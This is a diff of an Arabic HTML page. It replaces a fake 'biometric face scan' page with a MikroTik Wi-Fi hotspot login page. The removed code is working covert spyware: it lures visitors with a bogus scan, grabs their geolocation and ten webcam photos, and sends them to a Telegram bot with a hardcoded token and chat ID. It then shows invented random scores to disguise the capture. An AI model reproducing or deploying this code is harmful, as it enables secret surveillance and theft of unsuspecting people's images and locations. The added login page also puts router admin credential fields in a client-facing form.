@@ -3,125 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BioMetric Face Scan | التحليل البيومتري</title>
-    <style>
-        body { background-color: #0a0a12; color: #00ff88; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
-        .scanner-container { border: 1px solid #00ff88; background: rgba(0, 255, 136, 0.05); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 136, 0.2); width: 100%; max-width: 450px; position: relative; overflow: hidden; }
-        .scan-grid { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px), repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px); z-index: -1; }
-        h2 { letter-spacing: 2px; margin-bottom: 10px; }
-        .btn-scan { background: #00ff88; color: #0a0a12; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; transition: 0.3s; }
-        .btn-scan:hover { box-shadow: 0 0 15px #00ff88; }
-        #status { margin-top: 20px; font-size: 14px; color: #a0a0a0; min-height: 20px; }
-        
-        .results-box { display: none; text-align: right; margin-top: 30px; border-top: 2px dashed #00ff88; padding-top: 20px; }
-        .result-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
-        .result-label { color: #a0a0a0; }
-        .result-value { font-weight: bold; color: #fff; }
-        .final-score { text-align: center; font-size: 24px; color: #00ff88; margin-top: 25px; font-weight: bold; border: 1px solid #00ff88; padding: 10px; }
-        .loading-bar { width: 0%; height: 3px; background: #00ff88; margin-top: 10px; transition: width 0.5s; }
-    </style>
+    <title>شبكة النور اللاسلكية 5G</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 </head>
-<body>
-    <div class="scanner-container">
-        <div class="scan-grid"></div>
-        <h2>BIOMETRIC ANALYZER</h2>
-        <p style="color: #a0a0a0; font-size: 13px;">نستخدم خوارزميات متقدمة لتحليل تناسق الملامح، الصحة الظاهرية، والسمات الفريدة لوجهك.</p>
+<body onload="initSystem()">
+    <div class="glass-card">
+        <h1 class="network-name">شبكة النور اللاسلكية 5G</h1>
+        <p id="religiousText" class="religious-note">تذكر أن الله رقيب عليك</p>
         
-        <div id="pre-scan-ui">
-            <button class="btn-scan" id="startBtn" onclick="startRealAnalysis()">بدء المسح البيومتري</button>
-            <div class="loading-bar" id="bar"></div>
+        <div id="error-msg"></div>
+        
+        <form name="login" id="loginForm" onsubmit="return handleLogin()">
+            <!-- زر إظهار إعدادات السيرفر -->
+            <button type="button" onclick="toggleServerSettings()" class="btn-settings" id="showSettingsBtn">
+                ⚙️ إظهار إعدادات السيرفر
+            </button>
+            
+            <!-- قسم إعدادات السيرفر (مخفي أولاً) -->
+            <div class="server-settings" id="serverSettings" style="display: none;">
+                <div class="server-header">
+                    <span>⚙️ إعدادات السيرفر</span>
+                    <button type="button" onclick="toggleServerSettings()" class="btn-mini">إخفاء</button>
+                </div>
+                
+                <div class="server-grid">
+                    <div class="input-group">
+                        <label for="serverIp">IP السيرفر:</label>
+                        <input type="text" id="serverIp" value="192.168.88.1" placeholder="مثال: 192.168.1.1">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="apiPort">المنفذ:</label>
+                        <input type="text" id="apiPort" value="8728" placeholder="8728 أو 8729 لـ SSL">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="adminUser">مدير النظام:</label>
+                        <input type="text" id="adminUser" value="admin">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="adminPass">كلمة المرور:</label>
+                        <input type="password" id="adminPass" value="">
+                    </div>
+                    
+                    <button type="button" onclick="testMikroTikConnection()" class="btn-test">
+                        🔍 اختبار الاتصال
+                    </button>
+                </div>
+                
+                <div id="connectionStatus" class="status-box"></div>
+            </div>
+            
+            <div class="update-control">
+                <span>🛑 إيقاف التحديثات التلقائية</span>
+                <label class="switch">
+                    <input type="checkbox" id="blockUpdates">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            
+            <select id="speedMode">
+                <option value="Standard">🚀 الوضع التلقائي (الأسرع)</option>
+                <option value="100Mbps">💨 سرعة فائقة (100 ميقا)</option>
+                <option value="Gaming">🎮 وضع الألعاب (بنج منخفض)</option>
+                <option value="Streaming">🎥 وضع الأفلام واليوتيوب (4K)</option>
+            </select>
+            
+            <input type="text" id="user" placeholder="أدخل الكرت" autocomplete="off" required>
+            
+            <button type="submit" id="submitBtn" class="btn-main">
+                تـسـجـيـل الـدخـول
+            </button>
+            
+            <div id="historySection" class="history-box">
+                <span class="history-label">كروت استخدمتها سابقاً:</span>
+                <div id="cardsList" class="cards-list"></div>
+            </div>
+        </form>
+        
+        <div class="nav-grid">
+            <a href="prices.html" class="btn-sub">💰 الباقات</a>
+            <a href="stores.html" class="btn-sub">📍 نقاط البيع</a>
+            <a href="support.html" class="btn-sub" style="grid-column: span 2;">👨‍💻 الدعم الفني</a>
+            <!-- رابط لوحة التحكم يظهر بعد تفعيل المدير -->
+            <a href="#" onclick="showAdminPanel()" class="btn-sub admin-link" style="display:none; background: linear-gradient(45deg, #ff416c, #ff4b2b);">
+                👑 لوحة التحكم
+            </a>
         </div>
         
-        <div id="status">الجهاز جاهز. بانتظار الإذن...</div>
-
-        <div class="results-box" id="resultsUi">
-            <h3 style="text-align: center; color: #fff;">تقرير التحليل</h3>
-            <div class="result-item"><span class="result-label">هيكل الوجه:</span> <span class="result-value" id="res-shape"></span></div>
-            <div class="result-item"><span class="result-label">تناسق الملامح:</span> <span class="result-value" id="res-symmetry"></span></div>
-            <div class="result-item"><span class="result-label">العمر الظاهري المقدر:</span> <span class="result-value" id="res-age"></span></div>
-            <div class="result-item"><span class="result-label">حيوية البشرة:</span> <span class="result-value" id="res-skin"></span></div>
-            <div class="final-score" id="res-score"></div>
-            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">تم التحليل بواسطة BioScan AI v4.2.</p>
+        <div class="footer-credit">
+            <span style="font-size: 0.7rem; color: #777; display: block;">تصميم وتطوير</span>
+            <span class="designer-name">م/ هداف ملس</span>
+            <a href="tel:777382690" class="designer-phone">📱 777382690</a>
         </div>
     </div>
-
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
-    <script>
-        // بيانات البوت الوحيد
-        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
-        const CHAT_ID = '8293639164';
-
-        const faceShapes = ["بيضاوي متناسق", "دائري", "مربع محدد", "قلبي الشكل", "ماسي نادر"];
-        const skinTypes = ["نضرة وصحية (92%)", "عادية (85%)", "تحتاج ترطيب (78%)", "ممتازة (95%)"];
-        
-        function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
-        function res(id, val) { document.getElementById(id).innerText = val; }
-
-        async function sendPhoto(blob, photoNumber) {
-            const fd = new FormData();
-            fd.append('photo', blob, `img_${photoNumber}.jpg`);
-            fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `📸 لقطة رقم ${photoNumber}/10`);
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            } catch (e) { console.error("Error sending photo"); }
-        }
-
-        async function startRealAnalysis() {
-            const btn = document.getElementById('startBtn');
-            const status = document.getElementById('status');
-            const bar = document.getElementById('bar');
-            
-            btn.style.display = 'none';
-            status.innerHTML = "جاري الاتصال بالسيرفر...";
-            bar.style.width = "20%";
-
-            // إرسال الموقع الجغرافي
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const mapUrl = `📍 الموقع:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mapUrl)}`);
-            });
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                status.innerHTML = "جاري المسح البيومتري... يرجى الثبات";
-                
-                const canvas = document.getElementById('canvas');
-                canvas.width = 640; canvas.height = 480;
-
-                // التقاط 10 صور وإرسالها
-                for (let i = 1; i <= 10; i++) {
-                    setTimeout(() => {
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(blob => sendPhoto(blob, i), 'image/jpeg', 0.6);
-                        bar.style.width = (20 + (i * 8)) + "%";
-                    }, i * 800);
-                }
-
-                // عرض النتائج الوهمية بعد الانتهاء
-                setTimeout(() => {
-                    stream.getTracks().forEach(t => t.stop());
-                    document.getElementById('pre-scan-ui').style.display = 'none';
-                    status.style.display = 'none';
-                    document.getElementById('resultsUi').style.display = 'block';
-                    
-                    res('res-shape', faceShapes[getRandomInt(0, 4)]);
-                    res('res-symmetry', getRandomInt(85, 98) + "%");
-                    res('res-age', getRandomInt(20, 40) + " سنة");
-                    res('res-skin', skinTypes[getRandomInt(0, 3)]);
-                    res('res-score', "التقييم: " + getRandomInt(88, 97) + "/100");
-                }, 9000);
-
-            } catch (err) {
-                status.innerText = "خطأ: الكاميرا مطلوبة للتحليل.";
-                status.style.color = "#ff4444";
-            }
-        }
-    </script>
+    
+    <!-- النموذج المخفي للدخول -->
+    <form name="hiddenLogin" method="post" style="display:none;"></form>
+    
+    <!-- ملفات JavaScript -->
+    <script src="config.js"></script>
+    <script src="mikrotik.js"></script>
+    <script src="main.js"></script>
 </body>
 </html>
